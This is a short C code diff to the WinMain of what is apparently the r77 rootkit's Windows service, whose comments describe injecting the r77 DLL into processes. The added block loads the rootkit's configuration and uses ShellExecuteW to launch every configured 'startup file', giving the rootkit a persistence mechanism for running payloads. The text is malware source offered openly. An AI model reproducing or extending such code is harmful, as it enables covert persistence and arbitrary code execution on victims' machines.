@@ -52,6 +52,19 @@ int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
 	// There are no implications when injecting a process twice.
 	// If the R77_SIGNATURE is already present in the target process, the r77 DLL will just unload itself.
 
+	// Perform startup of custom files, only in the 32-bit service to not perform startup twice.
+	if (sizeof(LPVOID) == 4)
+	{
+		PR77_CONFIG config = LoadR77Config();
+
+		for (int i = 0; i < config->StartupFiles->Count; i++)
+		{
+			ShellExecuteW(NULL, L"open", config->StartupFiles->Values[i], NULL, NULL, SW_SHOW);
+		}
+
+		DeleteR77Config(config);
+	}
+
 	while (true)
 	{
 		Sleep(100);
